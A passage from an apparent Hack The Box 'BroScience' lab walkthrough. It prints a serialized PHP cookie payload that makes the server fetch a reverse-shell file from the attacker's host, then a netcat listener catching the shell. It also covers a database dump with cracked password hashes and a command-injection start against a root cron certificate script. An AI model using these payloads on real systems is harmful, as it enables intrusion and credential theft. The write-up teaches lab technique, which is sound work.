</span></span><span class=line><span class=cl>Serialized string <span class=k>for</span> AvatarInterface obj: O:15:<span class=s2>&#34;AvatarInterface&#34;</span>:2:<span class=o>{</span>s:3:<span class=s2>&#34;tmp&#34;</span><span class=p>;</span>s:34:<span class=s2>&#34;http://10.10.14.17:8000/my-cmd.php&#34;</span><span class=p>;</span>s:7:<span class=s2>&#34;imgPath&#34;</span><span class=p>;</span>s:24:<span class=s2>&#34;/var/www/html/my-cmd.php&#34;</span><span class=p>;</span><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Base64 encoded string <span class=k>for</span> serialized AvatarInterface string: <span class=nv>TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czozNDoiaHR0cDovLzEwLjEwLjE0LjE3OjgwMDAvbXktY21kLnBocCI7czo3OiJpbWdQYXRoIjtzOjI0OiIvdmFyL3d3dy9odG1sL215LWNtZC5waHAiO30</span><span class=o>=</span>
</span></span></code></pre></td></tr></table></div></div><p>After putting the base64 string in <code>user-prefs</code> cookie and reloading <a href=https://broscience.htb/index.php target=_blank rel="noopener noreffer">https://broscience.htb/index.php</a> &ndash; we see the server has downloaded our <code>my-cmd.php</code> reverse shell file from the ad-hoc python web server running on my machine!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$python</span> -m http.server <span class=m>8000</span>
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>8000</span> <span class=o>(</span>http://0.0.0.0:8000/<span class=o>)</span> ...
</span></span><span class=line><span class=cl>10.10.11.195 - - <span class=o>[</span>29/Jan/2023 14:00:47<span class=o>]</span> <span class=s2>&#34;GET /my-cmd.php HTTP/1.0&#34;</span> <span class=m>200</span> -
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s browse to <a href=http://broscience.htb/my-cmd.php target=_blank rel="noopener noreffer">http://broscience.htb/my-cmd.php</a>, and hopefully we should trigger our PHP file in the PHP server&rsquo;s interpreter, obtaining a reverse shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nc</span> -lvnp <span class=m>3322</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>3322</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.17<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.195<span class=o>]</span> <span class=m>54758</span>
</span></span><span class=line><span class=cl>Linux broscience 5.10.0-20-amd64 <span class=c1>#1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 GNU/Linux</span>
</span></span><span class=line><span class=cl> 22:00:58 up <span class=m>1</span> day, 21:27,  <span class=m>0</span> users,  load average: 0.00, 0.02, 0.01
</span></span><span class=line><span class=cl>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>833<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>bash-5.1$
</span></span><span class=line><span class=cl>bash-5.1$ cat /home/bill/user.txt
</span></span><span class=line><span class=cl>cat /home/bill/user.txt
</span></span><span class=line><span class=cl>cat: /home/bill/user.txt: Permission denied
</span></span></code></pre></td></tr></table></div></div><p>We have a foothold!!.. but can&rsquo;t read the user flag yet. Damn. We know from <code>includes/db_connect.php</code> the web app has a hard-coded connection string with credentials. So let&rsquo;s see if we can create a new php file to connect to postgres and dump the users table.. I saved this into <code>/var/html/www/db.php</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>include_once</span> <span class=s1>&#39;includes/db_connect.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$result</span> <span class=o>=</span> <span class=nx>pg_query</span><span class=p>(</span><span class=nv>$db_conn</span><span class=p>,</span> <span class=s2>&#34;SELECT id, username, password FROM users&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nv>$result</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>echo</span> <span class=s2>&#34;An error occurred.</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>exit</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=p>(</span><span class=nv>$row</span> <span class=o>=</span> <span class=nx>pg_fetch_row</span><span class=p>(</span><span class=nv>$result</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	  <span class=k>echo</span> <span class=s2>&#34;id: </span><span class=si>$row[0]</span><span class=s2>, username: </span><span class=si>$row[1]</span><span class=s2>, password: </span><span class=si>$row[2]</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	    <span class=k>echo</span> <span class=s2>&#34;&lt;br /&gt;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>Running it gives us a dump of users and password hashes. Yay!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash-5.1$ php db.php 
</span></span><span class=line><span class=cl>id: 1, username: administrator, password: 15657792073e8a843d4f91fc403454e1&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 2, username: bill, password: 13edad4932da9dbb57d9cd15b66ed104&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 3, username: michael, password: bd3dad50e2d578ecba87d5fa15ca5f85&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 4, username: john, password: a7eed23a7be6fe0d765197b1027453fe&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 5, username: dmytro, password: 5d15340bded5b9395d5d14b9c21bc82b&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 233, username: aaa, password: b2fc457a3f98256a392ff634ec615fc9&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 239, username: aaa<span class=s1>&#39;or&#39;</span>0, password: b2fc457a3f98256a392ff634ec615fc9&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 240, username: myuser, password: 876a42b400bcc73f92243010a0bb8978&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 246, username: myuser2, password: 876a42b400bcc73f92243010a0bb8978&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 247, username: 4567, password: b2fc457a3f98256a392ff634ec615fc9&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 86, username: x, password: 6d91921f04e89b1c6760df9b12b7ac1f&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 201, username: admin, password: 3b82b44090ee0a14e0f24172788e0bb8&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 258, username: 9999, password: b2fc457a3f98256a392ff634ec615fc9&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 147, username: test, password: 84c6e0688b2ef52ff1aeb922196d4e5a&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 264, username: 564, password: b2fc457a3f98256a392ff634ec615fc9&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 265, username: me@user.com, password: 8f864e441b88a597a2264551d1bfa831&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 159, username: testy, password: 2197435d3760c0397cf088552a4845bd&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 266, username: mycooluser, password: d80031863eb94bb355f5a04f415a315f&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 148, username: test2, password: 84c6e0688b2ef52ff1aeb922196d4e5a&lt;br /&gt;
</span></span><span class=line><span class=cl>id: 170, username: tefbcb, password: 2197435d3760c0397cf088552a4845bd&lt;br /&gt;
</span></span></code></pre></td></tr></table></div></div><p>Note our user flag is in <code>/home/bill/user.txt</code>, and there is a database user for the web-app also named bill - so maybe/likely the same user, and perhaps they reused their password?</p><p>As a reminder, our password hashing function is <code>md5(db_salt . _POST['password'])</code>, so we use mode 20 within hashcat:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Get the passwords above, and redirect to hashes.txt with our NaCl salt</span>
</span></span><span class=line><span class=cl><span class=nv>$pcregrep</span> -o1 <span class=s2>&#34;password:\s(\w+)&#34;</span> users.txt <span class=p>|</span>sed -e <span class=s1>&#39;s/$/:NaCl/&#39;</span> &gt; hashes.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$hashcat</span> -a <span class=m>0</span> -m <span class=m>20</span> hashes.txt /usr/share/wordlists/rockyou.txt
</span></span></code></pre></td></tr></table></div></div><p>It looks like we&rsquo;ve cracked several!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>3b82b44090ee0a14e0f24172788e0bb8:NaCl:123456     
</span></span><span class=line><span class=cl>b2fc457a3f98256a392ff634ec615fc9:NaCl:123456789  
</span></span><span class=line><span class=cl>8f864e441b88a597a2264551d1bfa831:NaCl:aaaa       
</span></span><span class=line><span class=cl>d80031863eb94bb355f5a04f415a315f:NaCl:foobar     
</span></span><span class=line><span class=cl>84c6e0688b2ef52ff1aeb922196d4e5a:NaCl:test       
</span></span><span class=line><span class=cl>876a42b400bcc73f92243010a0bb8978:NaCl:foo        
</span></span><span class=line><span class=cl>6d91921f04e89b1c6760df9b12b7ac1f:NaCl:x          
</span></span><span class=line><span class=cl>13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
</span></span><span class=line><span class=cl>5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest
</span></span><span class=line><span class=cl>bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples
</span></span></code></pre></td></tr></table></div></div><p>We got the password for username bill - <code>iluvhorsesandgym</code> - and we can SSH in, meaning we have the user flag!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ssh bill@broscience.htb
</span></span><span class=line><span class=cl>The authenticity of host <span class=s1>&#39;broscience.htb (10.10.11.195)&#39;</span> can<span class=s1>&#39;t be established.
</span></span></span><span class=line><span class=cl><span class=s1>ECDSA key fingerprint is SHA256:JGqMGEJRnLW3UdbkJFqzfa85qofae/pCqt15bo+0i0Y.
</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span>broscience.htb,10.10.11.195<span class=s1>&#39; (ECDSA) to the list of known hosts.
</span></span></span><span class=line><span class=cl><span class=s1>bill@broscience.htb&#39;</span>s password: 
</span></span><span class=line><span class=cl>Linux broscience 5.10.0-20-amd64 <span class=c1>#1 SMP Debian 5.10.158-2 (2022-12-13) x86_64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bash-5.1$ cat user.txt 
</span></span><span class=line><span class=cl>06128ae10344ecec8c2ae1def2bd67a8
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation>Privilege Escalation</h2><p>Initially, I tried:</p><ul><li>looking for setuid binaries</li><li>checking the shell environment</li><li>running LinPEAS</li><li>browsing the file system <code>/opt/renew_cert.sh</code> was the only thing that stood out as unusual</li></ul><p>I finally ran <code>pspy64 -r /tmp</code> to monitor <code>/tmp</code> , as the above script writes a new SSL certificate here. Here is the full script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$#</span><span class=s2>&#34;</span> -ne <span class=m>1</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=nv>$1</span> <span class=o>==</span> <span class=s2>&#34;-h&#34;</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=nv>$1</span> <span class=o>==</span> <span class=s2>&#34;--help&#34;</span> <span class=o>]</span> <span class=o>||</span> <span class=o>[</span> <span class=nv>$1</span> <span class=o>==</span> <span class=s2>&#34;help&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Usage: </span><span class=nv>$0</span><span class=s2> certificate.crt&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> 0<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> -f <span class=nv>$1</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    openssl x509 -in <span class=nv>$1</span> -noout -checkend <span class=m>86400</span> &gt; /dev/null
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>[</span> <span class=nv>$?</span> -eq <span class=m>0</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>        <span class=nb>echo</span> <span class=s2>&#34;No need to renew yet.&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nb>exit</span> 1<span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>subject</span><span class=o>=</span><span class=k>$(</span>openssl x509 -in <span class=nv>$1</span> -noout -subject <span class=p>|</span> cut -d <span class=s2>&#34;=&#34;</span> -f2-<span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>country</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$subject</span> <span class=p>|</span> grep -Eo <span class=s1>&#39;C = .{2}&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>state</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$subject</span> <span class=p>|</span> grep -Eo <span class=s1>&#39;ST = .*,&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>locality</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$subject</span> <span class=p>|</span> grep -Eo <span class=s1>&#39;L = .*,&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>organization</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$subject</span> <span class=p>|</span> grep -Eo <span class=s1>&#39;O = .*,&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>organizationUnit</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$subject</span> <span class=p>|</span> grep -Eo <span class=s1>&#39;OU = .*,&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>commonName</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=nv>$subject</span> <span class=p>|</span> grep -Eo <span class=s1>&#39;CN = .*,?&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>emailAddress</span><span class=o>=</span><span class=k>$(</span>openssl x509 -in <span class=nv>$1</span> -noout -email<span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>country</span><span class=o>=</span><span class=si>${</span><span class=nv>country</span><span class=p>:</span><span class=nv>4</span><span class=si>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>state</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=si>${</span><span class=nv>state</span><span class=p>:</span><span class=nv>5</span><span class=si>}</span> <span class=p>|</span> awk -F, <span class=s1>&#39;{print $1}&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>locality</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=si>${</span><span class=nv>locality</span><span class=p>:</span><span class=nv>3</span><span class=si>}</span> <span class=p>|</span> awk -F, <span class=s1>&#39;{print $1}&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>organization</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=si>${</span><span class=nv>organization</span><span class=p>:</span><span class=nv>4</span><span class=si>}</span> <span class=p>|</span> awk -F, <span class=s1>&#39;{print $1}&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>organizationUnit</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=si>${</span><span class=nv>organizationUnit</span><span class=p>:</span><span class=nv>5</span><span class=si>}</span> <span class=p>|</span> awk -F, <span class=s1>&#39;{print $1}&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>    <span class=nv>commonName</span><span class=o>=</span><span class=k>$(</span><span class=nb>echo</span> <span class=si>${</span><span class=nv>commonName</span><span class=p>:</span><span class=nv>5</span><span class=si>}</span> <span class=p>|</span> awk -F, <span class=s1>&#39;{print $1}&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=nv>$subject</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Country     =&gt; </span><span class=nv>$country</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;State       =&gt; </span><span class=nv>$state</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Locality    =&gt; </span><span class=nv>$locality</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Org Name    =&gt; </span><span class=nv>$organization</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Org Unit    =&gt; </span><span class=nv>$organizationUnit</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Common Name =&gt; </span><span class=nv>$commonName</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Email       =&gt; </span><span class=nv>$emailAddress</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> -e <span class=s2>&#34;\nGenerating certificate...&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days <span class=m>365</span> <span class=o>&lt;&lt;&lt;</span><span class=s2>&#34;</span><span class=nv>$country</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    </span><span class=nv>$state</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    </span><span class=nv>$locality</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    </span><span class=nv>$organization</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    </span><span class=nv>$organizationUnit</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    </span><span class=nv>$commonName</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    </span><span class=nv>$emailAddress</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;</span> 2&gt;/dev/null
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    /bin/bash -c <span class=s2>&#34;mv /tmp/temp.crt /home/bill/Certs/</span><span class=nv>$commonName</span><span class=s2>.crt&#34;</span>
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;File doesn&#39;t exist&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> 1<span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>Here&rsquo;s what process spy shows us:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>2023/01/29 01:58:01 CMD: UID=0     PID=104166 | /usr/sbin/CRON -f 
</span></span><span class=line><span class=cl>2023/01/29 01:58:01 CMD: UID=0     PID=104170 | /bin/bash /opt/renew_cert.sh /home/bill/Certs/broscience.crt 
</span></span><span class=line><span class=cl>2023/01/29 01:58:01 CMD: UID=0     PID=104169 | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt 
</span></span><span class=line><span class=cl>2023/01/29 01:58:01 CMD: UID=0     PID=104168 | /bin/bash /root/cron.sh 
</span></span><span class=line><span class=cl>2023/01/29 01:58:01 CMD: UID=0     PID=104167 | /bin/sh -c /root/cron.sh 
</span></span><span class=line><span class=cl>2023/01/29 01:58:01 CMD: UID=0     PID=104171 | /usr/bin/rm -r /home/bill/Certs/* 
</span></span><span class=line><span class=cl>2023/01/29 01:58:01 CMD: UID=0     PID=104172 | /usr/bin/rm -r /home/bill/Certs/. /home/bill/Certs/.. 
</span></span></code></pre></td></tr></table></div></div><p>So based on the bash script and pspy output above - the following appears to happen:</p><ol><li>a cron job runs, passing the file path <code>/home/bill/Certs/broscience.crt</code> to <code>/opt/renew_cert.sh</code></li><li>if the file exists, the script runs <code>openssl x509 -in $1 -noout -checkend 86400 > /dev/null</code></li><li>the script exits on a zero response (i.e. cert hasn&rsquo;t expired).</li><li>Otherwise, we extract the subject from the certificate file with <code>openssl x509 -in $1 -noout -subject | cut -d "=" -f2-</code></li><li>We extract out other cert information</li><li>we use openssl to generate a new certificate to <code>/tmp/temp.crt</code></li><li>We copy the temp cert back to <code>/home/bill/Certs/$commonName.crt</code> with <code>/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"</code></li></ol><p>I took a copy of the above script to play around with locally, and tried command injection on a certificate until I found the common name field works &ndash; here, we set a cert with 1 day expiry, and do command substitution of <code>$(id)</code> for common name, which we can see runs when the renew script executes:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$openssl</span> req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days <span class=m>1</span>
</span></span><span class=line><span class=cl>Generating a RSA private key
</span></span><span class=line><span class=cl>.........................................++++
</span></span><span class=line><span class=cl>.........................................................................................................................++++
</span></span><span class=line><span class=cl>writing new private key to <span class=s1>&#39;/tmp/temp.key&#39;</span>
</span></span><span class=line><span class=cl>-----
</span></span><span class=line><span class=cl>You are about to be asked to enter information that will be incorporated
</span></span><span class=line><span class=cl>into your certificate request.
</span></span><span class=line><span class=cl>What you are about to enter is what is called a Distinguished Name or a DN.
</span></span><span class=line><span class=cl>There are quite a few fields but you can leave some blank
</span></span><span class=line><span class=cl>For some fields there will be a default value,
</span></span><span class=line><span class=cl>If you enter <span class=s1>&#39;.&#39;</span>, the field will be left blank.
</span></span><span class=line><span class=cl>-----
</span></span><span class=line><span class=cl>Country Name <span class=o>(</span><span class=m>2</span> letter code<span class=o>)</span> <span class=o>[</span>AU<span class=o>]</span>:AU
</span></span><span class=line><span class=cl>State or Province Name <span class=o>(</span>full name<span class=o>)</span> <span class=o>[</span>Some-State<span class=o>]</span>:
